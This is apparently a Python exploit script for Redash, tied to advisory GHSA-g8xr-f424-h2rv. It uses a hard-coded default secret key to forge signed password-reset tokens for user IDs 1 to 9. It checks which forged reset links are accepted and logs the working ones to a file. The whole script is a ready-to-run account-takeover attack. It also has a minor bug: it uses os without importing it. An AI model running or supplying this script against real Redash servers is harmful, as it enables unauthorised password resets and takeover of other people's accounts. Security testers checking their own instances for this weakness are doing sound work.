#!/usr/bin/env python
#
# Redash Weak Secret 
#
# 
#
# By @RandomRobbieBF
# 
# https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv
#
# -*- coding: utf-8 -*-
import argparse
import requests
from itsdangerous import URLSafeTimedSerializer, SignatureExpired, BadSignature
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()




def check_work(url2,id):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"}
	response = session.get(url2, headers=headers,verify=False, allow_redirects=False,timeout=5)
	if response.status_code == 200:
		if "Enter your new password" in response.text:
			work = ("Rest Link "+url2+" - UserID: "+str(id)+"\n")
			with open('working.txt', 'a+', encoding='UTF8', newline='') as f:
				f.write(work)
				f.close()
				print(work)
	else:
		print(""+url2+"")
		print("Failed to Generate Reset Link for "+str(id)+"\n")

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--secret", required=False ,default="c292a0a3aa32397cdb050e233733900f",help="Weak REDASH_SECRET_KEY")
parser.add_argument("-u", "--url", required=True, default="http://192.168.1.170",help="URL of host to check will need http or https")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")
args = parser.parse_args()

if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy
            
url = args.url
secret = args.secret


# Weak REDASH_COOKIE_SECRET
serializer = URLSafeTimedSerializer(secret)

def invite_token(user):
    return serializer.dumps(str(user))

def reset_link_for_user(user):
    token = invite_token(user)
    invite_url = "{}/reset/{}".format(url,token)

    return invite_url



for id in range(1,10):
	url2 = reset_link_for_user(""+str(id)+"")
	check_work(url2,id)
